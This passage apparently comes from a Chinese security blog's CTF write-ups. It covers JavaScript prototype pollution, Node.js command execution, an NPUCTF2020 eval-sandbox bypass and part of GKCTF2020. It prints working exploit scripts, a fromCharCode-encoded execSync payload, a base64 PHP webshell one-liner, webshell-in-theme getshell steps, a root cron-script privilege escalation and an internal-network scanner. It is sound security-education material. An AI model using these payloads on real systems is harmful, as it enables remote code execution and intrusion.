<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)<span class="comment">//1 2</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>

<p>结果是，合并虽然成功了，但原型链没有被污染。</p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h2 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a><strong>hackit 2018</strong></h2><p>关键代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user=[];</span><br><span class="line">app.get(<span class="string">&#x27;/admin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">    <span class="comment">/*this is under development I guess ??*/</span></span><br><span class="line">    <span class="built_in">console</span>.log(user.admintoken);</span><br><span class="line">    <span class="keyword">if</span>(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.status(<span class="number">403</span>).send(<span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">app.post(<span class="string">&#x27;/api&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> client = req.body;</span><br><span class="line">    <span class="keyword">var</span> winner = <span class="literal">null</span>;</span><br><span class="line">    matrix[client.row][client.col] = client.data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>获取flag的条件是传入的querytoken要和user数组本身的admintoken的MD5值相等，且二者都要存在。</p>
<p>由代码可知，全文没有对user.admintokn进行赋值，所以理论上这个值是不存在的，但是下面有一句赋值语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">matrix[client.row][client.col] = client.data</span><br></pre></td></tr></table></figure>

<p><code>data</code>，<code>row</code>，<code>col</code>，都是我们post传入的值，都是可控的。所以可以构造原型链污染，下面我们先本地测试一下。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> client = &#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> matrix=[];</span><br><span class="line">matrix[client.row][client.col] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user=[]</span><br><span class="line"><span class="built_in">console</span>.log(user.admintoken)<span class="comment">//test</span></span><br></pre></td></tr></table></figure>

<p>看是可以成功控制user的，这里我们也可以知道原型链污染的条件就是要能够控制键名。</p>
<p>最终payload，要使用json传值，不然会出现错误。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://target/api&#x27;</span>,json=&#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>,<span class="string">&#x27;data&#x27;</span>:<span class="string">&#x27;qqq&#x27;</span>&#125;)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://target/admin?querytoken=&#x27;</span> + md5sumhex(<span class="string">&#x27;qqq&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<h1 id="JS中的弱类型"><a href="#JS中的弱类型" class="headerlink" title="JS中的弱类型"></a><strong>JS中的弱类型</strong></h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>]==<span class="number">1</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>==<span class="number">1</span>);<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log([<span class="number">1</span>]===<span class="number">1</span>);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>===<span class="number">1</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false，这一点是和php一样的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;str-1&quot;</span></span><br><span class="line"><span class="keyword">var</span> c = a+b</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a))<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(c)<span class="comment">//[object Object]str-1</span></span><br></pre></td></tr></table></figure>

<p>对象和字符串相加最后得到的是字符串。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a))<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a+b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(a+b)<span class="comment">//1,2,3haha</span></span><br></pre></td></tr></table></figure>

<p>数组和字符串相加最后也是得到字符串，所以可以基本得出结论就是，<strong>nodeJs中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">123</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">console</span>.log(num.length)<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(str.length)<span class="comment">//5</span></span><br><span class="line"><span class="built_in">console</span>.log(b.length)<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p>长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
<h1 id="模块加载与命令执行"><a href="#模块加载与命令执行" class="headerlink" title="模块加载与命令执行"></a><strong>模块加载与命令执行</strong></h1><p>在一些沙盒逃逸时我们通常是找到一个可以执行任意命令的payload，若是在ctf比赛中，我们需要getflag时通常是需要想尽办法加载模块来达成特殊要求。</p>
<p>比赛中常见可以通过<code>child_process</code>模块来加载模块，获得<code>exec</code>，<code>execfile</code>，<code>execSync</code>。</p>
<ul>
<li>通过require加载模块如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>通过global对象加载模块</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>对于一些上下文中没有require的情况下，通常是想办法使用后者来加载模块，事实上，NodeJs的<code>Function()</code>并不能找到require这个函数。</p>
<p>有些情况下可以直接用require，如<code>eval()</code>。</p>
<p>代码执行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec,<span class="number">1000</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec,<span class="number">1000</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="built_in">Function</span>(<span class="string">&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>)();</span><br></pre></td></tr></table></figure>

<p>这里可以发现对于Function来说上下文并不存在require，需要从global中一路调出来exec。</p>
<h1 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a><strong>[NPUCTF2020]验证🐎</strong></h1><p>题目源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到saferEval函数，我们看到只要绕过正则之后就可以利用在代码执行处所说的eval来执行代码。</p>
<p>看到调用了saferEval的地方有一个绕过，这里需要用到弱类型</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp;md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等，可以构造如下payload。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;e&quot;</span>:payload,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://32261d67-37fe-46f4-a1ac-6361db9f2bf5.node3.buuoj.cn/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;e&quot;</span>:<span class="string">&#x27;1+1&#x27;</span>,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><code>saferEval</code>部分构造函数执行任意代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以使用箭头函数配合Math通过原型获取到Function，使用上面提到的Function，通过global一路调出来exec执行任意命令。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>=&gt;(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor)</span><br></pre></td></tr></table></figure>

<p><code>Math=&gt;</code>其实是个匿名函数，看几个例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x =&gt; x * x</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function">//<span class="title">a</span> = <span class="title">x</span> =&gt; <span class="title">x</span>*<span class="title">x</span></span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span>(<span class="params">(x=&gt;x+x)(<span class="number">2</span>)</span>)//4</span></span><br></pre></td></tr></table></figure>

<p>后面是一个逗号运算，逗号运算我们知道是从左往右运算再最后返回最右边的值，我们由此得知这里是执行这么个运算。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.constructor.constructor(.....)</span><br></pre></td></tr></table></figure>

<p>这是什么意思呢</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.constructor)<span class="comment">//[Function: Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.constructor.constructor)<span class="comment">//[Function: Function]</span></span><br></pre></td></tr></table></figure>

<p>Function是构造函数他能够创建函数，可以简单理解他和eval类似，测试一个例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="built_in">Math</span>.constructor.constructor(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fun = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>,<span class="number">2</span>))<span class="comment">//3</span></span><br><span class="line"><span class="built_in">console</span>.log(fun(<span class="number">1</span>,<span class="number">2</span>))<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p><code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的，当然其他任意函数也是类似的。</p>
<p>这样虽然可以得到Function，但限于正则我们无法执行命令，这里绕过采用String.fromCharCode，String可以通过变量拼接拼接出一个字符串，再调用constructor获取到String对象。</p>
<p>最终payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>():</span></span><br><span class="line">    s = <span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line">a = payload()</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot;Start the program:&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://32261d67-37fe-46f4-a1ac-6361db9f2bf5.node3.buuoj.cn/&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">e = <span class="string">&quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;0&#125;))()))(Math+1)&quot;</span>.format(a)</span><br><span class="line">data = json.dumps(&#123;<span class="string">&#x27;e&#x27;</span>: e, <span class="string">&quot;first&quot;</span>: [<span class="number">1</span>], <span class="string">&quot;second&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;)</span><br><span class="line">r = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h1><p><a class="foo" href="https://www.plasf.cn/2020/04/24/JavaScript原型链污染学习笔记/#资源" target="_blank">JavaScript原型链污染学习笔记</a></p>
<p><a class="foo" href="https://xz.aliyun.com/t/7182#toc-5" target="_blank">浅析javascript原型链污染攻击</a></p>
<p><a class="foo" href="https://xz.aliyun.com/t/7752" target="_blank">nodejs一些入门特性&amp;&amp;实战</a></p>
<p><a class="foo" href="https://www.plasf.cn/2020/04/25/Node专题训练-1" target="_blank">NPUCTF2020 验证🐎</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>GKCTF2020</title>
    <url>/2020/06/01/GKCTF%202020/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>抽空复现一下</p>
<h4 id="老八小超市"><a href="#老八小超市" class="headerlink" title="老八小超市"></a><strong>老八小超市</strong></h4><p>打开之后是个shopxo的商城，用默认后台账号密码登录，成功进入后台。</p>
<p>下载免费的主题，把一句话木马放进去。</p>
<p>安装主题，即可getshell</p>
<p>参考：<a class="foo" href="http://www.nctry.com/1660.html" target="_blank">传送门</a></p>
<p>然后在假flag告知下得知真flag在/root目录下，但是因为当前是www-data用户是没有权限访问/root目录的。</p>
<p>然后在根目录下发现auto.sh</p>
<img src="http://img.kawhi.xyz/image-20200526220703847.png" style="high:80%;width:80%;" />

<img src="http://img.kawhi.xyz/image-20200526220146582.png" style="high:80%;width:80%;" />

<p>输入ps -ef发现auto.sh是root权限执行的。</p>
<p>然后在/var/mail/makeflaghint.py修改一下代码，加入两行内容读取/root/flag到/flag.hint</p>
<img src="http://img.kawhi.xyz/image-20200526220613995.png" style="high:80%;width:80%;" />

<p>然后在flag.hint里面成功读取flag。</p>
<h4 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a><strong>CheckIN</strong></h4><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line">&#123;</span><br><span class="line">        public $code = null;</span><br><span class="line">        public $decode = null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;];</span><br><span class="line">                $this-&gt;decode = @base64_decode( $this-&gt;code );</span><br><span class="line"><span class="meta">                @Eval($this-&gt;decode);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName(); </span><br></pre></td></tr></table></figure>

<p>phpinfo();</p>
<p>base64加密为 cGhwaW5mbygpOw== </p>
<p>回显成功，利用一句话连接 </p>
<p>eval($_POST[cmd]);</p>
<p>base64加密得ZXZhbCgkX1BPU1RbY21kXSk7</p>
<p>在根目录看到一个flag，但是没有权限查看，还有一个readflag文件。</p>
<p>但是发现蚁剑终端并不能用，回到phpinfo()发现很多方法被禁用。</p>
<img src="http://img.kawhi.xyz/image-20200526225116128.png" style="high:80%;width:80%;" />

<p>过滤了很多function，想到绕过disable_functions，上传一个文件使其执行任意命令，exp地址：<a class="foo" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank">传送门</a></p>
<p>在这里稍微改一下。</p>
<img src="http://img.kawhi.xyz/image-20200526225159436.png" style="high:80%;width:80%;" />

<p>然后在页面就可以得到flag。</p>
<img src="http://img.kawhi.xyz/image-20200526225043564.png" style="high:80%;width:80%;" />

<h4 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a><strong>cve版签到</strong></h4><p>通过%00截断可以让<code>get_headers()</code>请求到错误的主机，于是请求到本地。</p>
<img src="http://img.kawhi.xyz/image-20200526231215560.png" style="high:80%;width:80%;" />

<p>再根据提示把后缀改为123</p>
<img src="http://img.kawhi.xyz/image-20200526231327900.png" style="high:80%;width:80%;" />

<p>即可得到flag。</p>
<h4 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a><strong>EZ三剑客-EzWeb</strong></h4><p>访问?secret得到本机ip</p>
<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>写个脚本探测内网</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

